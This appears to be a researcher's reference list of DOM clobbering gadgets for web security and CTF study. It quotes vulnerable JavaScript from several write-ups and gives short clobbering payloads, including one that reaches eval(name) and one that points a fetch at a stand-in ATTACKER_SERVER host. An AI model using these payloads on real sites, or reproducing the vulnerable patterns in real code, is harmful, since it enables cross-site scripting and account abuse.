## Existing DOM Clobbering Gadgets


### Github


### Blogs from Google

https://research.securitum.com/xss-in-amp4email-dom-clobbering/
https://blog.huli.tw/2021/01/23/en/dom-clobbering/
```
var script = window.document.createElement("script");
script.async = false;

var loc;
if (AMP_MODE.test && window.testLocation) {
    loc = window.testLocation
} else {
    loc = window.location;
}

if (AMP_MODE.localDev) {
    loc = loc.protocol + "//" + loc.host + "/dist"
} else {
    loc = "https://cdn.ampproject.org";
}

var singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + "/" : "";
b.src = loc + "/rtv/" + AMP_MODE.rtvVersion; + "/" + singlePass + "v0/" + pluginName + ".js";

document.head.appendChild(b);
```

+ https://lebr0nli.github.io/blog/security/fwordCTF2021/#shisui-web
```
window.SETTINGS = window.SETTINGS || [{
  dataset:{
    "timezone":"",
    "location":"Tunisia"
  },
  Title:"FwordFeedbacks",
  check: false	
}]
function looseJsonParse(obj){
  if(obj.length<35){  
	return eval("(" + obj + ")");
  }else{
    return {location:"Limit Length Exceeded"}
  }
}
function addInfos(){
	if(window.showInfos && SETTINGS.check  && SETTINGS[0].dataset.timezone.length>2){
        var infos=`{location:${SETTINGS[0].dataset.location}}`;
	var result=document.createElement("p");
	result.textContent=`Location: ${looseJsonParse(infos).location} Timezone: UTC+1` ;
	document.getElementById("out").appendChild(result);
	console.log(result);
	}
}
addInfos()
```
```
<a id=SETTINGS data-timezone=aaa data-location=eval(name)></a>
<a id=SETTINGS name=check></a>
<a id=showInfos></a>
```

+ https://ctftime.org/writeup/37463
```
async function loadBody() {
    let extension = null;
    if (window.debug?.extension) {
        let res = await fetch(window.debug?.extension.toString());
        extension = await res.json();
    }
```
```
<a id="debug"></a><a id="debug" name="extension" href="//ATTACKER_SERVER"></a>
```


+ https://wizer-ctf.com/writeups/ctf14.html
```
export default function Home() {
  const router = useRouter();
  const { yourName, yourAvatar, transferTo, pointsToTransfer } = router.query;
  const isNameProvided = typeof yourName === 'string' && yourName.length > 0;
  React.useEffect(() => {
    if (router.isReady && isNameProvided) {
      // Sanitize your name and avatar image
      const name = DOMPurify.sanitize(yourName);
      const avatar = yourAvatar ? DOMPurify.sanitize(String(yourAvatar)) : '<img src="/favicon.png" width="20px">';
      document.getElementById('name').innerText = name;
      document.getElementById('avatar').innerHTML = avatar;
      if(window.transferBalance && transferTo && pointsToTransfer) {
        var formData = JSON.stringify(router.query.serializeArray());
        const response = $.ajax({type: "POST", url: '../api/transferPoints', async: false,
          data: formData, success: function(){}, dataType: 'json',
          contentType : 'application/json'})
        if(response.status === 200) { alert(`${name}, you’ve successfully transfered ${pointsToTransfer} + 
        points to account ID ${transferTo}`); }
        else { $("#error").text(decodeURIComponent(response.responseText)); }
      }
    }
  }, [router.isReady, isNameProvided]);

  return (
    <main className="text-center mt-5">
      <h6>
        <span id="avatar"></span>&nbsp;
        <span>Hello <span id="name"></span> what would you want to do next?</span>
      </h6>
      <h3 className="h3 mb-3 fw-normal">Points management</h3>
      <h5 className="h5 mb-2 fw-normal" style={{cursor: 'pointer'}}
        onClick={() => { router.push('/transfer')}}>Transfer Points</h5>
      <h5 className="h5 mb-2 fw-normal" style={{cursor: 'pointer'}}
        onClick={() => { router.push('/buy')}}>Buy points</h5>
      <h5 className="h5 mb-2 fw-normal" style={{cursor: 'pointer'}}
        onClick={() => { router.push('/trends')}}>Points spending trends</h5>
      <div className={styles.footer}>
        Powered by <Image src="/wizer.svg"
          alt="Wizer"
          width={200}
          height={100}
          className={styles.logo} />
      </div>
    </main>
  )
}
```


+ https://github.com/aszx87410/ctf-writeups/issues/55
```
function reloadRecaptchaScript(index) {
  // delay for a bit to not block main thread
  setTimeout(() => {
    console.log('reload', index, document.scripts[index])
    const element = document.scripts[index]
    const src = element.getAttribute('src')
    if (!src.startsWith('https://www.google.com/recaptcha/')) {
      throw new Error('reload failed, invalid src')
    }
    element.parentNode.removeChild(element)
    loadScript(src)
  }, 1000)
}
```

+ https://gist.github.com/terjanq/e2198440c4fdfbdec43e921b600d4a1d#recaptcha-for-the-rescue
```
function writeOutput() {
  if (statusCode !== 3) {
    if (CONFIG.unsafeRender) {
      document.getElementById('output').innerHTML = output;
    } else {
      document.getElementById('output').innerText = output;
    }
  }
}
```